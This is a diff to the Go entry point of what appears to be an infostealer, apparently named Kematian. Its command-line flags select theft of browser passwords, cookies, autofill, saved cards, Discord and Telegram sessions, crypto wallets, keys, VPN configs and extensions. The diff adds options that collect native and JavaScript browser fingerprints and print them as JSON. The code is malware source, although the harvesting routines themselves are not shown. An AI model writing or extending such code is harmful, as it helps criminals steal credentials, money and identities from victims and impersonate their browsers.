@@ -41,22 +41,24 @@ func main() {
 		noInject   bool
 		includeZip bool
 
-		all        bool
-		passwords  bool
-		cookies    bool
-		autofill   bool
-		history    bool
-		bookmarks  bool
-		cards      bool
-		discord    bool
-		files      bool
-		wallets    bool
-		telegram   bool
-		keys       bool
-		apps       bool
-		gaming     bool
-		vpn        bool
-		extensions bool
+		all           bool
+		passwords     bool
+		cookies       bool
+		autofill      bool
+		history       bool
+		bookmarks     bool
+		cards         bool
+		discord       bool
+		files         bool
+		wallets       bool
+		telegram      bool
+		keys          bool
+		apps          bool
+		gaming        bool
+		vpn           bool
+		extensions    bool
+		fingerprint   bool
+		fingerprintJS bool
 	)
 
 	flag.StringVar(&outPath, "out", "", "write the full result JSON to this file")
@@ -82,10 +84,30 @@ func main() {
 	flag.BoolVar(&gaming, "gaming", false, "scan gaming platforms")
 	flag.BoolVar(&vpn, "vpn", false, "scan VPN configs")
 	flag.BoolVar(&extensions, "extensions", false, "scan browser extensions")
+	flag.BoolVar(&fingerprint, "fingerprint", false, "collect the native browser fingerprint and exit")
+	flag.BoolVar(&fingerprintJS, "fingerprint-js", false, "collect the JS (canvas/WebGL/audio) fingerprint and exit")
 	flag.Parse()
 
 	if noInject {
 		os.Setenv("KEMATIAN_NO_INJECT", "1")
+	}
+
+	if fingerprint {
+		fp := recovery.CollectFingerprint()
+		data, _ := json.MarshalIndent(fp, "", "  ")
+		fmt.Println(string(data))
+		return
+	}
+
+	if fingerprintJS {
+		fp := recovery.CollectJSFingerprint()
+		if fp == nil {
+			fmt.Println("{\"error\": \"failed to collect JS fingerprint\"}")
+			return
+		}
+		data, _ := json.MarshalIndent(fp, "", "  ")
+		fmt.Println(string(data))
+		return
 	}
 
 	anyData := passwords || cookies || autofill || history || bookmarks || cards ||
